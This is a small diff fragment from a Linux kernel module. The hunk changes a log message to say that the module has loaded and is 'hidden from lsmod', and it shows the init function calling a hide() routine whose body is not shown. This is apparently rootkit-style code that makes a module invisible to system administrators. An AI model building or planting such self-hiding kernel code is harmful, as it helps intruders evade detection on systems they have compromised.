@@ -25,7 +25,7 @@ void hide(void)
 
 static int __init lsmod_init(void)
 {
-    printk(KERN_INFO "Module load fdp\n");
+    printk(KERN_INFO "Module load and hidden from lsmod\n");
     hide();
     return 0;
 }
